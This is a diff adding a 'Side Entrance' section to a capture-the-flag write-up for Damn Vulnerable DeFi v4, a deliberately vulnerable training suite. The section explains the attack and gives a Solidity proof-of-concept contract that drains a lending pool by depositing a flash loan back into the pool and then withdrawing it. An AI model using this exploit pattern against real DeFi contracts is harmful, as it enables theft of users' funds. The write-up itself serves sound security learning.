@@ -96,3 +96,44 @@ contract AttackTruster {
 See [test/naive-receiver/Truster.t.sol](https://github.com/CanonicalJP/damn-vulnerable-defi-v4/blob/master/test/naive-receiver/Truster.t.sol)
 
 ----
+
+## SIDE ENTRANCE
+
+### Objective
+_from `_isSolved()`in test_
+1. _All rescued funds sent to recovery account_
+
+### Attack Analysis
+- The attack can be executed by asking a flahs loan through `flashLoan()`and then depositing the total value in the same call using `deposit()`.
+
+### POC
+```solidity
+function test_sideEntrance() public checkSolvedByPlayer {
+    Attack attackPool = new Attack(address(pool));
+    attackPool.exploit(ETHER_IN_POOL, recovery);
+}
+
+contract Attack {
+    SideEntranceLenderPool private pool;
+
+    constructor (address _pool) {
+        pool = SideEntranceLenderPool(_pool);
+    }
+
+    receive() external payable {}
+
+    function execute() external payable {
+        pool.deposit{value: msg.value}();
+    }
+
+    function exploit(uint256 _amount, address _recovery) external{
+        pool.flashLoan(_amount);
+        pool.withdraw();
+        (bool success, ) = _recovery.call{value: _amount}("");
+        if(!success) console.log("Transfer failed");
+    }
+}
+```
+See [test/side-entrance/SideEntrance.t.sol](https://github.com/CanonicalJP/damn-vulnerable-defi-v4/blob/master/test/side-entrance/SideEntrance.t.sol)
+
+----
